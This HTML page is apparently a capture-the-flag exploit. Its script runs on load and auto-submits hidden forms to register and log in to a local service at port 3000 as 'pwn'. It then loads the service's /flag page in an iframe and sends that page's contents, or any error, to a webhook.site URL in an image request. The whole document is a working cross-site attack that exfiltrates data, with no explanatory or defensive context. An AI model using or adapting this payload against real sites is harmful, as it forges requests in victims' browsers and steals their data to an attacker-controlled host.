<!DOCTYPE html>
<html>
<body>
<script>
// iframe 생성
var iframe = document.createElement('iframe');
iframe.name = 'f1';
iframe.id = 'f1';
document.body.appendChild(iframe);

// 1. Register (없으면 만들고, 있으면 에러나도 상관없음)
var regForm = document.createElement('form');
regForm.method = 'POST';
regForm.action = 'http://0.0.0.0:3000/register';
regForm.target = 'f1';
regForm.innerHTML = '<input name="username" value="pwn"><input name="password" value="pwn">';
document.body.appendChild(regForm);
regForm.submit();

// 2. Login
setTimeout(function(){
  var loginForm = document.createElement('form');
  loginForm.method = 'POST';
  loginForm.action = 'http://0.0.0.0:3000/login';
  loginForm.target = 'f1';
  loginForm.innerHTML = '<input name="username" value="pwn"><input name="password" value="pwn">';
  document.body.appendChild(loginForm);
  loginForm.submit();
}, 300);

// 3. Flag
setTimeout(function(){
  var flagFrame = document.createElement('iframe');
  flagFrame.id = 'ff';
  flagFrame.src = 'http://0.0.0.0:3000/flag';
  document.body.appendChild(flagFrame);
  
  setTimeout(function(){
    try {
      var c = document.getElementById('ff').contentDocument.body.innerHTML;
      new Image().src = 'https://webhook.site/showontest?flag=' + encodeURIComponent(c);
    } catch(e) {
      new Image().src = 'https://webhook.site/showontest?err=' + encodeURIComponent(e.message);
    }
  }, 500);
}, 1000);
</script>
</body>
</html>